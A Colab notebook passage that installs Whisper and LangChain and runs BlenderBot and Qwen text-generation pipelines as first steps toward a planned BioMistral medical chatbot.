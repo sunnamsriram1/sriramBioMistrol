{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "i7ue59hvVY67"
      },
      "source": []
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "id": "yNEptFAR3aOk",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "d1b06e1f-0f35-4cd3-b12c-4efd6285c241"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Requirement already satisfied: openai-whisper in /usr/local/lib/python3.10/dist-packages (20231117)\n",
            "Requirement already satisfied: numba in /usr/local/lib/python3.10/dist-packages (from openai-whisper) (0.60.0)\n",
            "Requirement already satisfied: numpy in /usr/local/lib/python3.10/dist-packages (from openai-whisper) (1.26.4)\n",
            "Requirement already satisfied: torch in /usr/local/lib/python3.10/dist-packages (from openai-whisper) (2.4.0+cu121)\n",
            "Requirement already satisfied: tqdm in /usr/local/lib/python3.10/dist-packages (from openai-whisper) (4.66.5)\n",
            "Requirement already satisfied: more-itertools in /usr/local/lib/python3.10/dist-packages (from openai-whisper) (10.3.0)\n",
            "Requirement already satisfied: tiktoken in /usr/local/lib/python3.10/dist-packages (from openai-whisper) (0.7.0)\n",
            "Requirement already satisfied: triton>=2.0.0 in /usr/local/lib/python3.10/dist-packages (from openai-whisper) (2.3.1)\n",
            "Requirement already satisfied: filelock in /usr/local/lib/python3.10/dist-packages (from triton>=2.0.0->openai-whisper) (3.16.0)\n",
            "Requirement already satisfied: llvmlite<0.44,>=0.43.0dev0 in /usr/local/lib/python3.10/dist-packages (from numba->openai-whisper) (0.43.0)\n",
            "Requirement already satisfied: regex>=2022.1.18 in /usr/local/lib/python3.10/dist-packages (from tiktoken->openai-whisper) (2024.5.15)\n",
            "Requirement already satisfied: requests>=2.26.0 in /usr/local/lib/python3.10/dist-packages (from tiktoken->openai-whisper) (2.32.3)\n",
            "Requirement already satisfied: typing-extensions>=4.8.0 in /usr/local/lib/python3.10/dist-packages (from torch->openai-whisper) (4.12.2)\n",
            "Requirement already satisfied: sympy in /usr/local/lib/python3.10/dist-packages (from torch->openai-whisper) (1.13.2)\n",
            "Requirement already satisfied: networkx in /usr/local/lib/python3.10/dist-packages (from torch->openai-whisper) (3.3)\n",
            "Requirement already satisfied: jinja2 in /usr/local/lib/python3.10/dist-packages (from torch->openai-whisper) (3.1.4)\n",
            "Requirement already satisfied: fsspec in /usr/local/lib/python3.10/dist-packages (from torch->openai-whisper) (2024.6.1)\n",
            "Requirement already satisfied: charset-normalizer<4,>=2 in /usr/local/lib/python3.10/dist-packages (from requests>=2.26.0->tiktoken->openai-whisper) (3.3.2)\n",
            "Requirement already satisfied: idna<4,>=2.5 in /usr/local/lib/python3.10/dist-packages (from requests>=2.26.0->tiktoken->openai-whisper) (3.8)\n",
            "Requirement already satisfied: urllib3<3,>=1.21.1 in /usr/local/lib/python3.10/dist-packages (from requests>=2.26.0->tiktoken->openai-whisper) (2.0.7)\n",
            "Requirement already satisfied: certifi>=2017.4.17 in /usr/local/lib/python3.10/dist-packages (from requests>=2.26.0->tiktoken->openai-whisper) (2024.8.30)\n",
            "Requirement already satisfied: MarkupSafe>=2.0 in /usr/local/lib/python3.10/dist-packages (from jinja2->torch->openai-whisper) (2.1.5)\n",
            "Requirement already satisfied: mpmath<1.4,>=1.1.0 in /usr/local/lib/python3.10/dist-packages (from sympy->torch->openai-whisper) (1.3.0)\n"
          ]
        }
      ],
      "source": [
        "pip install -U openai-whisper"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "gpcWgSjpb7d_"
      },
      "source": [
        "BlenderBot-Encoder-**Decoder**\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 2,
      "metadata": {
        "id": "pkb-KhzQ3tT8",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "8b934f54-c340-46f3-f10b-654c8bda0620"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting git+https://github.com/openai/whisper.git\n",
            "  Cloning https://github.com/openai/whisper.git to /tmp/pip-req-build-nq6hqe3k\n",
            "  Running command git clone --filter=blob:none --quiet https://github.com/openai/whisper.git /tmp/pip-req-build-nq6hqe3k\n",
            "  Resolved https://github.com/openai/whisper.git to commit 279133e3107392276dc509148da1f41bfb532c7e\n",
            "  Installing build dependencies ... \u001b[?25l\u001b[?25hdone\n",
            "  Getting requirements to build wheel ... \u001b[?25l\u001b[?25hdone\n",
            "  Preparing metadata (pyproject.toml) ... \u001b[?25l\u001b[?25hdone\n",
            "Building wheels for collected packages: openai-whisper\n",
            "  Building wheel for openai-whisper (pyproject.toml) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for openai-whisper: filename=openai_whisper-20231117-py3-none-any.whl size=802819 sha256=e71a2406a3c4ee73d33d2bc3827d413462f89edb1dd082438369bd3db1e2a1ec\n",
            "  Stored in directory: /tmp/pip-ephem-wheel-cache-_uwdk_u3/wheels/8b/6c/d0/622666868c179f156cf595c8b6f06f88bc5d80c4b31dccaa03\n",
            "Successfully built openai-whisper\n",
            "Installing collected packages: openai-whisper\n",
            "  Attempting uninstall: openai-whisper\n",
            "    Found existing installation: openai-whisper 20231117\n",
            "    Uninstalling openai-whisper-20231117:\n",
            "      Successfully uninstalled openai-whisper-20231117\n",
            "Successfully installed openai-whisper-20231117\n"
          ]
        }
      ],
      "source": [
        "pip install --upgrade --no-deps --force-reinstall git+https://github.com/openai/whisper.git"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 3,
      "metadata": {
        "id": "BQ_I7kUE3gzk",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "8fb56230-9ab7-4f20-954f-c58dfd86eff5"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting git+https://github.com/openai/whisper.git\n",
            "  Cloning https://github.com/openai/whisper.git to /tmp/pip-req-build-nnjgzis7\n",
            "  Running command git clone --filter=blob:none --quiet https://github.com/openai/whisper.git /tmp/pip-req-build-nnjgzis7\n",
            "  Resolved https://github.com/openai/whisper.git to commit 279133e3107392276dc509148da1f41bfb532c7e\n",
            "  Installing build dependencies ... \u001b[?25l\u001b[?25hdone\n",
            "  Getting requirements to build wheel ... \u001b[?25l\u001b[?25hdone\n",
            "  Preparing metadata (pyproject.toml) ... \u001b[?25l\u001b[?25hdone\n",
            "Requirement already satisfied: numba in /usr/local/lib/python3.10/dist-packages (from openai-whisper==20231117) (0.60.0)\n",
            "Requirement already satisfied: numpy in /usr/local/lib/python3.10/dist-packages (from openai-whisper==20231117) (1.26.4)\n",
            "Requirement already satisfied: torch in /usr/local/lib/python3.10/dist-packages (from openai-whisper==20231117) (2.4.0+cu121)\n",
            "Requirement already satisfied: tqdm in /usr/local/lib/python3.10/dist-packages (from openai-whisper==20231117) (4.66.5)\n",
            "Requirement already satisfied: more-itertools in /usr/local/lib/python3.10/dist-packages (from openai-whisper==20231117) (10.3.0)\n",
            "Requirement already satisfied: tiktoken in /usr/local/lib/python3.10/dist-packages (from openai-whisper==20231117) (0.7.0)\n",
            "Requirement already satisfied: triton>=2.0.0 in /usr/local/lib/python3.10/dist-packages (from openai-whisper==20231117) (2.3.1)\n",
            "Requirement already satisfied: filelock in /usr/local/lib/python3.10/dist-packages (from triton>=2.0.0->openai-whisper==20231117) (3.16.0)\n",
            "Requirement already satisfied: llvmlite<0.44,>=0.43.0dev0 in /usr/local/lib/python3.10/dist-packages (from numba->openai-whisper==20231117) (0.43.0)\n",
            "Requirement already satisfied: regex>=2022.1.18 in /usr/local/lib/python3.10/dist-packages (from tiktoken->openai-whisper==20231117) (2024.5.15)\n",
            "Requirement already satisfied: requests>=2.26.0 in /usr/local/lib/python3.10/dist-packages (from tiktoken->openai-whisper==20231117) (2.32.3)\n",
            "Requirement already satisfied: typing-extensions>=4.8.0 in /usr/local/lib/python3.10/dist-packages (from torch->openai-whisper==20231117) (4.12.2)\n",
            "Requirement already satisfied: sympy in /usr/local/lib/python3.10/dist-packages (from torch->openai-whisper==20231117) (1.13.2)\n",
            "Requirement already satisfied: networkx in /usr/local/lib/python3.10/dist-packages (from torch->openai-whisper==20231117) (3.3)\n",
            "Requirement already satisfied: jinja2 in /usr/local/lib/python3.10/dist-packages (from torch->openai-whisper==20231117) (3.1.4)\n",
            "Requirement already satisfied: fsspec in /usr/local/lib/python3.10/dist-packages (from torch->openai-whisper==20231117) (2024.6.1)\n",
            "Requirement already satisfied: charset-normalizer<4,>=2 in /usr/local/lib/python3.10/dist-packages (from requests>=2.26.0->tiktoken->openai-whisper==20231117) (3.3.2)\n",
            "Requirement already satisfied: idna<4,>=2.5 in /usr/local/lib/python3.10/dist-packages (from requests>=2.26.0->tiktoken->openai-whisper==20231117) (3.8)\n",
            "Requirement already satisfied: urllib3<3,>=1.21.1 in /usr/local/lib/python3.10/dist-packages (from requests>=2.26.0->tiktoken->openai-whisper==20231117) (2.0.7)\n",
            "Requirement already satisfied: certifi>=2017.4.17 in /usr/local/lib/python3.10/dist-packages (from requests>=2.26.0->tiktoken->openai-whisper==20231117) (2024.8.30)\n",
            "Requirement already satisfied: MarkupSafe>=2.0 in /usr/local/lib/python3.10/dist-packages (from jinja2->torch->openai-whisper==20231117) (2.1.5)\n",
            "Requirement already satisfied: mpmath<1.4,>=1.1.0 in /usr/local/lib/python3.10/dist-packages (from sympy->torch->openai-whisper==20231117) (1.3.0)\n"
          ]
        }
      ],
      "source": [
        "pip install git+https://github.com/openai/whisper.git"
      ]
    },
    {
      "source": [
        "!pip install langchain"
      ],
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "OPYci9cq1PyN",
        "outputId": "37e92529-a779-4cb1-c70d-e014e3e62b6a"
      },
      "execution_count": 4,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Requirement already satisfied: langchain in /usr/local/lib/python3.10/dist-packages (0.3.0)\n",
            "Requirement already satisfied: PyYAML>=5.3 in /usr/local/lib/python3.10/dist-packages (from langchain) (6.0.2)\n",
            "Requirement already satisfied: SQLAlchemy<3,>=1.4 in /usr/local/lib/python3.10/dist-packages (from langchain) (2.0.34)\n",
            "Requirement already satisfied: aiohttp<4.0.0,>=3.8.3 in /usr/local/lib/python3.10/dist-packages (from langchain) (3.10.5)\n",
            "Requirement already satisfied: async-timeout<5.0.0,>=4.0.0 in /usr/local/lib/python3.10/dist-packages (from langchain) (4.0.3)\n",
            "Requirement already satisfied: langchain-core<0.4.0,>=0.3.0 in /usr/local/lib/python3.10/dist-packages (from langchain) (0.3.1)\n",
            "Requirement already satisfied: langchain-text-splitters<0.4.0,>=0.3.0 in /usr/local/lib/python3.10/dist-packages (from langchain) (0.3.0)\n",
            "Requirement already satisfied: langsmith<0.2.0,>=0.1.17 in /usr/local/lib/python3.10/dist-packages (from langchain) (0.1.121)\n",
            "Requirement already satisfied: numpy<2,>=1 in /usr/local/lib/python3.10/dist-packages (from langchain) (1.26.4)\n",
            "Requirement already satisfied: pydantic<3.0.0,>=2.7.4 in /usr/local/lib/python3.10/dist-packages (from langchain) (2.9.1)\n",
            "Requirement already satisfied: requests<3,>=2 in /usr/local/lib/python3.10/dist-packages (from langchain) (2.32.3)\n",
            "Requirement already satisfied: tenacity!=8.4.0,<9.0.0,>=8.1.0 in /usr/local/lib/python3.10/dist-packages (from langchain) (8.5.0)\n",
            "Requirement already satisfied: aiohappyeyeballs>=2.3.0 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (2.4.0)\n",
            "Requirement already satisfied: aiosignal>=1.1.2 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (1.3.1)\n",
            "Requirement already satisfied: attrs>=17.3.0 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (24.2.0)\n",
            "Requirement already satisfied: frozenlist>=1.1.1 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (1.4.1)\n",
            "Requirement already satisfied: multidict<7.0,>=4.5 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (6.1.0)\n",
            "Requirement already satisfied: yarl<2.0,>=1.0 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (1.11.1)\n",
            "Requirement already satisfied: jsonpatch<2.0,>=1.33 in /usr/local/lib/python3.10/dist-packages (from langchain-core<0.4.0,>=0.3.0->langchain) (1.33)\n",
            "Requirement already satisfied: packaging<25,>=23.2 in /usr/local/lib/python3.10/dist-packages (from langchain-core<0.4.0,>=0.3.0->langchain) (24.1)\n",
            "Requirement already satisfied: typing-extensions>=4.7 in /usr/local/lib/python3.10/dist-packages (from langchain-core<0.4.0,>=0.3.0->langchain) (4.12.2)\n",
            "Requirement already satisfied: httpx<1,>=0.23.0 in /usr/local/lib/python3.10/dist-packages (from langsmith<0.2.0,>=0.1.17->langchain) (0.27.2)\n",
            "Requirement already satisfied: orjson<4.0.0,>=3.9.14 in /usr/local/lib/python3.10/dist-packages (from langsmith<0.2.0,>=0.1.17->langchain) (3.10.7)\n",
            "Requirement already satisfied: annotated-types>=0.6.0 in /usr/local/lib/python3.10/dist-packages (from pydantic<3.0.0,>=2.7.4->langchain) (0.7.0)\n",
            "Requirement already satisfied: pydantic-core==2.23.3 in /usr/local/lib/python3.10/dist-packages (from pydantic<3.0.0,>=2.7.4->langchain) (2.23.3)\n",
            "Requirement already satisfied: charset-normalizer<4,>=2 in /usr/local/lib/python3.10/dist-packages (from requests<3,>=2->langchain) (3.3.2)\n",
            "Requirement already satisfied: idna<4,>=2.5 in /usr/local/lib/python3.10/dist-packages (from requests<3,>=2->langchain) (3.8)\n",
            "Requirement already satisfied: urllib3<3,>=1.21.1 in /usr/local/lib/python3.10/dist-packages (from requests<3,>=2->langchain) (2.0.7)\n",
            "Requirement already satisfied: certifi>=2017.4.17 in /usr/local/lib/python3.10/dist-packages (from requests<3,>=2->langchain) (2024.8.30)\n",
            "Requirement already satisfied: greenlet!=0.4.17 in /usr/local/lib/python3.10/dist-packages (from SQLAlchemy<3,>=1.4->langchain) (3.1.0)\n",
            "Requirement already satisfied: anyio in /usr/local/lib/python3.10/dist-packages (from httpx<1,>=0.23.0->langsmith<0.2.0,>=0.1.17->langchain) (3.7.1)\n",
            "Requirement already satisfied: httpcore==1.* in /usr/local/lib/python3.10/dist-packages (from httpx<1,>=0.23.0->langsmith<0.2.0,>=0.1.17->langchain) (1.0.5)\n",
            "Requirement already satisfied: sniffio in /usr/local/lib/python3.10/dist-packages (from httpx<1,>=0.23.0->langsmith<0.2.0,>=0.1.17->langchain) (1.3.1)\n",
            "Requirement already satisfied: h11<0.15,>=0.13 in /usr/local/lib/python3.10/dist-packages (from httpcore==1.*->httpx<1,>=0.23.0->langsmith<0.2.0,>=0.1.17->langchain) (0.14.0)\n",
            "Requirement already satisfied: jsonpointer>=1.9 in /usr/local/lib/python3.10/dist-packages (from jsonpatch<2.0,>=1.33->langchain-core<0.4.0,>=0.3.0->langchain) (3.0.0)\n",
            "Requirement already satisfied: exceptiongroup in /usr/local/lib/python3.10/dist-packages (from anyio->httpx<1,>=0.23.0->langsmith<0.2.0,>=0.1.17->langchain) (1.2.2)\n"
          ]
        }
      ]
    },
    {
      "source": [
        "!pip install langchain_community # Install the missing langchain_community package."
      ],
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "78wydKeO1Z-6",
        "outputId": "f0786c63-8ec7-4a94-826e-df10deb4b215"
      },
      "execution_count": 5,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Requirement already satisfied: langchain_community in /usr/local/lib/python3.10/dist-packages (0.3.0)\n",
            "Requirement already satisfied: PyYAML>=5.3 in /usr/local/lib/python3.10/dist-packages (from langchain_community) (6.0.2)\n",
            "Requirement already satisfied: SQLAlchemy<3,>=1.4 in /usr/local/lib/python3.10/dist-packages (from langchain_community) (2.0.34)\n",
            "Requirement already satisfied: aiohttp<4.0.0,>=3.8.3 in /usr/local/lib/python3.10/dist-packages (from langchain_community) (3.10.5)\n",
            "Requirement already satisfied: dataclasses-json<0.7,>=0.5.7 in /usr/local/lib/python3.10/dist-packages (from langchain_community) (0.6.7)\n",
            "Requirement already satisfied: langchain<0.4.0,>=0.3.0 in /usr/local/lib/python3.10/dist-packages (from langchain_community) (0.3.0)\n",
            "Requirement already satisfied: langchain-core<0.4.0,>=0.3.0 in /usr/local/lib/python3.10/dist-packages (from langchain_community) (0.3.1)\n",
            "Requirement already satisfied: langsmith<0.2.0,>=0.1.112 in /usr/local/lib/python3.10/dist-packages (from langchain_community) (0.1.121)\n",
            "Requirement already satisfied: numpy<2,>=1 in /usr/local/lib/python3.10/dist-packages (from langchain_community) (1.26.4)\n",
            "Requirement already satisfied: pydantic-settings<3.0.0,>=2.4.0 in /usr/local/lib/python3.10/dist-packages (from langchain_community) (2.5.2)\n",
            "Requirement already satisfied: requests<3,>=2 in /usr/local/lib/python3.10/dist-packages (from langchain_community) (2.32.3)\n",
            "Requirement already satisfied: tenacity!=8.4.0,<9.0.0,>=8.1.0 in /usr/local/lib/python3.10/dist-packages (from langchain_community) (8.5.0)\n",
            "Requirement already satisfied: aiohappyeyeballs>=2.3.0 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain_community) (2.4.0)\n",
            "Requirement already satisfied: aiosignal>=1.1.2 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain_community) (1.3.1)\n",
            "Requirement already satisfied: attrs>=17.3.0 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain_community) (24.2.0)\n",
            "Requirement already satisfied: frozenlist>=1.1.1 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain_community) (1.4.1)\n",
            "Requirement already satisfied: multidict<7.0,>=4.5 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain_community) (6.1.0)\n",
            "Requirement already satisfied: yarl<2.0,>=1.0 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain_community) (1.11.1)\n",
            "Requirement already satisfied: async-timeout<5.0,>=4.0 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain_community) (4.0.3)\n",
            "Requirement already satisfied: marshmallow<4.0.0,>=3.18.0 in /usr/local/lib/python3.10/dist-packages (from dataclasses-json<0.7,>=0.5.7->langchain_community) (3.22.0)\n",
            "Requirement already satisfied: typing-inspect<1,>=0.4.0 in /usr/local/lib/python3.10/dist-packages (from dataclasses-json<0.7,>=0.5.7->langchain_community) (0.9.0)\n",
            "Requirement already satisfied: langchain-text-splitters<0.4.0,>=0.3.0 in /usr/local/lib/python3.10/dist-packages (from langchain<0.4.0,>=0.3.0->langchain_community) (0.3.0)\n",
            "Requirement already satisfied: pydantic<3.0.0,>=2.7.4 in /usr/local/lib/python3.10/dist-packages (from langchain<0.4.0,>=0.3.0->langchain_community) (2.9.1)\n",
            "Requirement already satisfied: jsonpatch<2.0,>=1.33 in /usr/local/lib/python3.10/dist-packages (from langchain-core<0.4.0,>=0.3.0->langchain_community) (1.33)\n",
            "Requirement already satisfied: packaging<25,>=23.2 in /usr/local/lib/python3.10/dist-packages (from langchain-core<0.4.0,>=0.3.0->langchain_community) (24.1)\n",
            "Requirement already satisfied: typing-extensions>=4.7 in /usr/local/lib/python3.10/dist-packages (from langchain-core<0.4.0,>=0.3.0->langchain_community) (4.12.2)\n",
            "Requirement already satisfied: httpx<1,>=0.23.0 in /usr/local/lib/python3.10/dist-packages (from langsmith<0.2.0,>=0.1.112->langchain_community) (0.27.2)\n",
            "Requirement already satisfied: orjson<4.0.0,>=3.9.14 in /usr/local/lib/python3.10/dist-packages (from langsmith<0.2.0,>=0.1.112->langchain_community) (3.10.7)\n",
            "Requirement already satisfied: python-dotenv>=0.21.0 in /usr/local/lib/python3.10/dist-packages (from pydantic-settings<3.0.0,>=2.4.0->langchain_community) (1.0.1)\n",
            "Requirement already satisfied: charset-normalizer<4,>=2 in /usr/local/lib/python3.10/dist-packages (from requests<3,>=2->langchain_community) (3.3.2)\n",
            "Requirement already satisfied: idna<4,>=2.5 in /usr/local/lib/python3.10/dist-packages (from requests<3,>=2->langchain_community) (3.8)\n",
            "Requirement already satisfied: urllib3<3,>=1.21.1 in /usr/local/lib/python3.10/dist-packages (from requests<3,>=2->langchain_community) (2.0.7)\n",
            "Requirement already satisfied: certifi>=2017.4.17 in /usr/local/lib/python3.10/dist-packages (from requests<3,>=2->langchain_community) (2024.8.30)\n",
            "Requirement already satisfied: greenlet!=0.4.17 in /usr/local/lib/python3.10/dist-packages (from SQLAlchemy<3,>=1.4->langchain_community) (3.1.0)\n",
            "Requirement already satisfied: anyio in /usr/local/lib/python3.10/dist-packages (from httpx<1,>=0.23.0->langsmith<0.2.0,>=0.1.112->langchain_community) (3.7.1)\n",
            "Requirement already satisfied: httpcore==1.* in /usr/local/lib/python3.10/dist-packages (from httpx<1,>=0.23.0->langsmith<0.2.0,>=0.1.112->langchain_community) (1.0.5)\n",
            "Requirement already satisfied: sniffio in /usr/local/lib/python3.10/dist-packages (from httpx<1,>=0.23.0->langsmith<0.2.0,>=0.1.112->langchain_community) (1.3.1)\n",
            "Requirement already satisfied: h11<0.15,>=0.13 in /usr/local/lib/python3.10/dist-packages (from httpcore==1.*->httpx<1,>=0.23.0->langsmith<0.2.0,>=0.1.112->langchain_community) (0.14.0)\n",
            "Requirement already satisfied: jsonpointer>=1.9 in /usr/local/lib/python3.10/dist-packages (from jsonpatch<2.0,>=1.33->langchain-core<0.4.0,>=0.3.0->langchain_community) (3.0.0)\n",
            "Requirement already satisfied: annotated-types>=0.6.0 in /usr/local/lib/python3.10/dist-packages (from pydantic<3.0.0,>=2.7.4->langchain<0.4.0,>=0.3.0->langchain_community) (0.7.0)\n",
            "Requirement already satisfied: pydantic-core==2.23.3 in /usr/local/lib/python3.10/dist-packages (from pydantic<3.0.0,>=2.7.4->langchain<0.4.0,>=0.3.0->langchain_community) (2.23.3)\n",
            "Requirement already satisfied: mypy-extensions>=0.3.0 in /usr/local/lib/python3.10/dist-packages (from typing-inspect<1,>=0.4.0->dataclasses-json<0.7,>=0.5.7->langchain_community) (1.0.0)\n",
            "Requirement already satisfied: exceptiongroup in /usr/local/lib/python3.10/dist-packages (from anyio->httpx<1,>=0.23.0->langsmith<0.2.0,>=0.1.112->langchain_community) (1.2.2)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 6,
      "metadata": {
        "id": "uyxAAx90cQEE",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "344b6d83-b411-4963-8a50-15c2d3900aa7"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "/usr/local/lib/python3.10/dist-packages/transformers/tokenization_utils_base.py:1601: FutureWarning: `clean_up_tokenization_spaces` was not set. It will be set to `True` by default. This behavior will be depracted in transformers v4.45, and will be then set to `False` by default. For more details check this issue: https://github.com/huggingface/transformers/issues/31884\n",
            "  warnings.warn(\n",
            "Hardware accelerator e.g. GPU is available in the environment, but no `device` argument is passed to the `Pipeline` object. Model will be on CPU.\n",
            "<ipython-input-6-15780d7432c3>:23: LangChainDeprecationWarning: The class `HuggingFacePipeline` was deprecated in LangChain 0.0.37 and will be removed in 1.0. An updated version of the class exists in the langchain-huggingface package and should be used instead. To use it run `pip install -U langchain-huggingface` and import as `from langchain_huggingface import HuggingFacePipeline`.\n",
            "  local_llm = HuggingFacePipeline(pipeline=pipe)\n",
            "<ipython-input-6-15780d7432c3>:29: LangChainDeprecationWarning: The class `LLMChain` was deprecated in LangChain 0.1.17 and will be removed in 1.0. Use RunnableSequence, e.g., `prompt | llm` instead.\n",
            "  llm_chain = LLMChain(prompt=prompt, llm=local_llm)\n",
            "<ipython-input-6-15780d7432c3>:35: LangChainDeprecationWarning: The method `Chain.run` was deprecated in langchain 0.1.0 and will be removed in 1.0. Use invoke instead.\n",
            "  print(llm_chain.run(question))\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            " Well, I'm a college student, and I have a lot of free time on my hands.\n"
          ]
        }
      ],
      "source": [
        "from langchain.llms import HuggingFacePipeline\n",
        "from langchain.prompts import PromptTemplate\n",
        "from langchain.chains import LLMChain\n",
        "import torch\n",
        "from transformers import AutoTokenizer, AutoModelForSeq2SeqLM, pipeline\n",
        "\n",
        "# Define model id\n",
        "model_id = 'facebook/blenderbot-1B-distill'\n",
        "\n",
        "# Load tokenizer and model\n",
        "tokenizer = AutoTokenizer.from_pretrained(model_id)\n",
        "model = AutoModelForSeq2SeqLM.from_pretrained(model_id)\n",
        "\n",
        "# Create a pipeline\n",
        "pipe = pipeline(\n",
        "    \"text2text-generation\",\n",
        "    model=model,\n",
        "    tokenizer=tokenizer,\n",
        "    max_length=100\n",
        ")\n",
        "\n",
        "# Initialize local LLM with HuggingFacePipeline\n",
        "local_llm = HuggingFacePipeline(pipeline=pipe)\n",
        "\n",
        "# Define the prompt\n",
        "prompt = PromptTemplate(template=\"{question}\", input_variables=[\"question\"])\n",
        "\n",
        "# Create the LLM chain\n",
        "llm_chain = LLMChain(prompt=prompt, llm=local_llm)\n",
        "\n",
        "# Define the question\n",
        "question = \"Tell me about you?\"\n",
        "\n",
        "# Run the chain with the question and print the result\n",
        "print(llm_chain.run(question))\n"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from langchain.llms import HuggingFacePipeline\n",
        "from langchain.prompts import PromptTemplate\n",
        "from langchain.chains import LLMChain\n",
        "import torch\n",
        "from transformers import AutoTokenizer, AutoModelForSeq2SeqLM, pipeline\n",
        "\n",
        "# Define model id\n",
        "model_id = 'nikhil928/facebook-blenderbot-1B-distill'\n",
        "\n",
        "# Load tokenizer and model\n",
        "tokenizer = AutoTokenizer.from_pretrained(model_id)\n",
        "model = AutoModelForSeq2SeqLM.from_pretrained(model_id)\n",
        "\n",
        "# Create a pipeline\n",
        "pipe = pipeline(\n",
        "    \"text2text-generation\",\n",
        "    model=model,\n",
        "    tokenizer=tokenizer,\n",
        "    max_length=100\n",
        ")\n",
        "\n",
        "# Initialize local LLM with HuggingFacePipeline\n",
        "local_llm = HuggingFacePipeline(pipeline=pipe)\n",
        "\n",
        "# Define the prompt template\n",
        "prompt = PromptTemplate(template=\"{question}\", input_variables=[\"question\"])\n",
        "\n",
        "# Create the LLM chain\n",
        "llm_chain = LLMChain(prompt=prompt, llm=local_llm)\n",
        "\n",
        "# Start the interactive loop\n",
        "while True:\n",
        "    # Get user input\n",
        "    question = input(\"Ask a question (or type 'exit' to quit): \")\n",
        "\n",
        "    # Check if the user wants to exit\n",
        "    if question.lower() == 'exit':\n",
        "        print(\"Exiting the conversation.\")\n",
        "        break\n",
        "\n",
        "    # Run the chain with the question and print the result\n",
        "    response = llm_chain.run(question)\n",
        "    print(f\"Response: {response}\\n\")\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "oBhEje_S3zJJ",
        "outputId": "29aa1e16-ad4d-42e8-e76d-e42fa8696da1"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "/usr/local/lib/python3.10/dist-packages/transformers/tokenization_utils_base.py:1601: FutureWarning: `clean_up_tokenization_spaces` was not set. It will be set to `True` by default. This behavior will be depracted in transformers v4.45, and will be then set to `False` by default. For more details check this issue: https://github.com/huggingface/transformers/issues/31884\n",
            "  warnings.warn(\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "J177jX51J1Li"
      },
      "source": [
        "# Build BioMistral Medical RAG Chatbot using BioMistral Open Source LLM\n",
        "\n",
        "In the notebook we will build a Medical Chatbot with BioMistral LLM and Heart Health pdf file."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "X-Wc40YKQp-S"
      },
      "outputs": [],
      "source": [
        "#shell\n",
        "!pip install huggingface_hub"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "_VV3_0xvRaDo"
      },
      "outputs": [],
      "source": [
        "from transformers import pipeline\n",
        "\n",
        "# Initialize the pipeline with the correct model\n",
        "pipe = pipeline(\"text-generation\", model=\"Qwen/Qwen2-VL-7B-Instruct\")\n",
        "\n",
        "# Text input\n",
        "input_text = \"Who are you?\"\n",
        "\n",
        "# Generate text with the given input and max length\n",
        "result = pipe(input_text, max_length=50, num_return_sequences=1, do_sample=True)\n",
        "\n",
        "# Print the result\n",
        "for i, generated_text in enumerate(result):\n",
        "    print(f\"Generated Text {i + 1}: {generated_text['generated_text']}\")\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "i6h9NbEGVBCw"
      },
      "outputs": [],
      "source": [
        "from transformers import pipeline\n",
        "\n",
        "# Initialize the pipeline with the correct model\n",
        "pipe = pipeline(\"text-generation\", model=\"Qwen/Qwen2-VL-7B-Instruct\")\n",
        "\n",
        "# Text input\n",
        "input_text = \"Who are you?\"\n",
        "\n",
        "# Generate text with the given input and max length\n",
        "result = pipe(input_text, max_length=50, num_return_sequences=1, do_sample=True)\n",
        "\n",
        "# Print the result\n",
        "for i, generated_text in enumerate(result):\n",
        "    print(f\"Generated Text {i + 1}: {generated_text['generated_text']}\")\n"
